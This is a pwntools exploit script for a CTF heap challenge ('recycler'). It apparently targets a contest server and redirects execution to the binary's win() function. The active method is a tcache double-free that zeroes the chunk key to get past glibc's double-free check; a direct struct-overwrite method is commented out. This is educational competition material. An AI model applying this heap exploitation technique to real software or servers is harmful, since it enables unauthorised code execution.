#!/usr/bin/env python3
from pwn import *

if args.LOCAL:
    elf = ELF('./recycler_patched', checksec=False)
else:
    elf = ELF('./recycler', checksec=False)

# No PIE in the binary, we don't need a leak of the glibc address
context.binary = elf

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB: 
            gdb.attach(r)
    else:
        r = remote('offsec.m0lecon.it',13515)
    return r

p = conn()
win_addr = elf.sym.win
log.info(f"win() address: {win_addr:#x}")
print(str(win_addr))

# helper functions
def create(idx, data=b'A'*24):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'payload: ', data)

def invoke(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())


def main():
    ''' ---SOL. 1: directly modify the struct--- 
    
    create(0)
    edit(0,p64(win_addr).ljust(32, b'A'))
    invoke(0)
    p.interactive()'''

    ''' ---SOL. 2: double free attack--- 
    When we free the first time, the allocator puts the fd pointer(NULL) and the key on the first 16 bits of the chunk.
    After editing those bits with 0s, to bypass the double free check, when we do the second free(), the allocator
    overwrites the fd pointer to the next chunk of the tcache list, which is chunk A itself, so we don't worry about safe-linking. 
    When we call malloc(1), malloc(0), the same chunk A is given to them, so they will point to the same address. '''
    create(0)
    free(0)
    edit(0, b'0'*16)
    free(0)         # double free check bypassed
    create(1)
    create(0)
    edit(1,p64(win_addr))
    invoke(0)
    p.interactive()

if __name__ == "__main__":
    main()
